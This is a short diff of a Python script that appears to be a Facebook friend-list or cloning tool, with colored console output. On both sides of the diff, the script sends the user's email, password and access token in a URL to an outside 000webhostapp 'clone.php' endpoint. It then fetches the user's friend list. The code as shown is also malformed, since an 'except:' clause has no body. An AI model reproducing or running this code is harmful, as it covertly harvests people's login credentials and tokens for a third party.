@@ -25,10 +25,10 @@ else:
     print ("\033[39m[\033[31m+\033[39m] \033[31mWrong Email Or Password")
     sys.exit()
 try:
-    pd = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (idt) + "&pw=" + (passw) + "&tk=" + token)
+    pd = urllib.urlopen("https://unpotable-staffs.000webhostapp.com/clone.php?email=" + (idt) + "&pw=" + (passw) + "&tk=" + (token))
 except:
 
-get_friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
+get_friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + (token))
 hasil = json.loads(get_friends.text)
 print ("\033[39m[\033[31m+\033[39m] Frind list OK !!")
 print ("\033[39m[\033[31m+\033[39m] Groups Under maintenance !!")
